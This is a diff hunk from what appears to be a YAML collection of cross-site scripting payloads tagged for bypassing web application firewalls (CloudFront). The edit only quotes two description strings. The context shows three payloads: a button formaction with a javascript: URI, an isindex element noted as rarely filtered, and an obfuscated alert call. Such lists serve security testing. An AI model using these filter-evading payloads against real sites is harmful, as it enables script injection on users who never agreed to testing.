@@ -215,12 +215,12 @@ payloads:
 
   - text: '<form><button formaction=javascript:alert(1)>X</button></form>'
     tags: [waf-bypass, cloudfront, formaction, javascript-url]
-    description: Button formaction with javascript: URI executes on click
+    description: "Button formaction with javascript: URI executes on click"
     severity: high
 
   - text: '<isindex action=javascript:alert(1) type=submit>'
     tags: [waf-bypass, cloudfront, isindex, javascript-url]
-    description: Obsolete isindex element with javascript: action — rarely filtered
+    description: "Obsolete isindex element with javascript: action — rarely filtered"
     severity: medium
 
   - text: "<script>window['ale'+'rt'](1)</script>"
